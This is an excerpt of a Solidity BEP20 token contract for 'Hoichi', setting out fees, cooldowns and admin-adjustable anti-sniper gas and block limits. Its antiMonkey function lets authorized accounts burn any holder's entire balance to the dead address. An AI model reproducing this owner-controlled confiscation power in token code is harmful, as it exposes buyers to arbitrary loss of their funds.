...
/*
Hoichi 芳一 (HOICHI) - t.me/HoichiTokenPortal
*/
...
contract Hoichi is IBEP20, Auth {
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO = 0x0000000000000000000000000000000000000000;

    string _name = "Hoichi \u82b3\u4e00";
    string _symbol = "HOICHI";
    uint8 constant _decimals = 4;

    uint256 _totalSupply = 369369369369 * (10 ** _decimals);
    ...
    uint256 marketingFee = 40;      // 4%
    uint256 liquidityFee = 60;      // 6%
    uint256 totalFee = 100;         // 10%
	...
	uint256 private antiFeeBlocks = 4;
	uint256 private antiFeeGasLimit = 9 gwei;
    ...
    constructor () Auth(msg.sender) {
        ...
        isTimelockExempt[deployer] = true;
    ...
    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        ...
        if (isPair[sender] && buyCooldownEnabled && !isTimelockExempt[tx.origin] && amount >= _totalSupply * 11 / 10000) {
    ...
    function antiMonkey(address sniperAddress) external authorized {
        ...
        isTxLimitExempt[sniperAddress] = true;
        _basicTransfer(sniperAddress, DEAD, balanceOf(sniperAddress));
        isTxLimitExempt[sniperAddress] = false;
    }

    function setAntiBlocks(uint256 blocks) external authorized {
		antiFeeBlocks = blocks;
        require(antiFeeBlocks <= 20, "Maximum is 20 blocks");
	}

	function setAntiGas(bool active, uint256 quantity) external authorized {
		gasLimitActive = active;
		antiFeeGasLimit = quantity * (10 ** 9);
        require(antiFeeGasLimit > 8 gwei, "Needs to be at least 8 gwei.");
	}
